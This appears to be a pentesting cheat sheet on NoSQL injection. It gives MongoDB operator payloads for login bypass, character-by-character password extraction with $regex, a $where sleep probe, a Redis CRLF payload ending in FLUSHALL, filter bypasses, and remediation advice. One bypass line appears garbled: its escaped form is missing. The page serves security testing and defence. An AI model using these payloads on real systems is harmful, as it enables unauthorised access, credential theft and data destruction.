# NoSQL Injection

> Document/key-value store queries (MongoDB, CouchDB, Cassandra, Redis, Firestore) built from untrusted input. Authorized testing only. Map: WSTG-INPV-05 (broader SQLi guidance applies), CWE-943.

## TL;DR
- Most-seen: **MongoDB operator injection** via JSON inputs that pass through to a `$where` / find query without operator filtering.
- Pattern: input arrives as JSON, framework hands the raw object to driver → attacker supplies `{"$ne": null}` etc., turning an equality match into a wildcard.
- Redis "injection" is really CRLF injection over RESP (see [./crlf-header-injection.md](./crlf-header-injection.md)) — different shape.
- Defence: schema-validate inputs (Ajv/Zod/Pydantic); never pass raw client JSON into a query; positive-model type enforcement.

## Detection / Discovery
| Probe | Engine | Effect |
| --- | --- | --- |
| `{"$ne": ""}` as a password | MongoDB | Login bypass — "password != ''" matches any user. |
| `{"$gt": ""}` | MongoDB | Same effect; lexicographic comparison. |
| `{"$regex": ".*"}` | MongoDB | Wildcard. |
| `{"$where": "function() { return true; }"}` | MongoDB (`$where`) | Server-side JS eval — RCE-class in older versions. |
| `username[$ne]=foo` (URL-encoded operator) | MongoDB via Express/PHP query parsing | Some parsers create `{ne: "foo"}` objects from `[$ne]` syntax. |

```bash
# JSON probe — login with operator-bypass
curl -X POST https://target/login -H 'Content-Type: application/json' \
     -d '{"username":"admin","password":{"$ne":null}}'

# URL-encoded operator (Express body-parser style)
curl 'https://target/login' --data-urlencode 'username=admin' --data-urlencode 'password[$ne]=x'
```

## Exploitation

### Auth bypass — operator injection
```json
{"username":"admin","password":{"$ne":""}}      // password != '' matches everything
{"username":"admin","password":{"$gt":""}}      // password > '' same effect
{"username":{"$regex":"^a"},"password":{"$ne":""}}    // username starts with 'a'
```

### Blind extraction via `$regex`
Iterate one character at a time:
```json
{"username":"admin","password":{"$regex":"^a"}}  // 200 if password starts with 'a'
{"username":"admin","password":{"$regex":"^b"}}  // 401 if not
…iterate alphabet, then ^aa, ^ab, …
```
Time-bounded if no in-band response: `$where` with `sleep()` on older MongoDB.

### Server-side JS injection (`$where`, MongoDB ≤ 4.x)
```json
{"$where": "this.username == 'admin' && sleep(5000)"}
```
RCE if the server is misconfigured to allow `$function` (Mongo 4.4+) with shell access. Modern MongoDB disables script execution by default since 4.4.

### Redis injection via CRLF
If the app interpolates user input into a Redis `EVAL` / `SET` command line without proper escaping:
```
SET key value\r\nFLUSHALL
```
Drops the entire DB. Defence: use a proper Redis client library; never build commands by string concat.

## Bypasses
- Server's input validator blocks `$ne` literal → use `$ne` (Unicode escape JSON parses to `$ne`).
- Server strips object values that look like operators → nest deeper: `{"$or": [{"username":"admin"}, {"$where":"…"}]}`.
- Blocklist on `$where` → use `$expr` + `$function` (Mongo 4.4+).

## Defence / Remediation
- **Schema validation** at the request boundary (Ajv, Zod, Joi, Pydantic). Reject objects with keys starting `$` for user-input fields.
- **Type-cast** every field before query — if `password` should be a string, force `String(req.body.password)` or reject if not a string.
- **Use ODM with explicit query builders** (Mongoose's `findOne({ username: req.body.username })` is fine; the bug appears when the *value* is an object instead of a string).
- **Mongo-sanitize** middleware (`express-mongo-sanitize`) strips `$`/`.` from incoming objects as defence-in-depth.
- **Disable server-side scripting** in MongoDB (`security.javascriptEnabled: false`).
- **Parameterised commands** for Redis (use the client's variadic API; never build command strings).
- **Principle of least privilege** on the DB user — read-only credentials for read paths.
- CWE-943 Improper Neutralization of Special Elements in Data Query Logic.

## Sources
- OWASP Cheat Sheet — Query Parameterization (general): https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
- PortSwigger — NoSQL injection: https://portswigger.net/web-security/nosql-injection
- PayloadsAllTheThings NoSQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- HackTricks NoSQL Injection: https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
- express-mongo-sanitize: https://github.com/fiznool/express-mongo-sanitize
- MongoDB security checklist: https://www.mongodb.com/docs/manual/administration/security-checklist/
- CWE-943: https://cwe.mitre.org/data/definitions/943.html
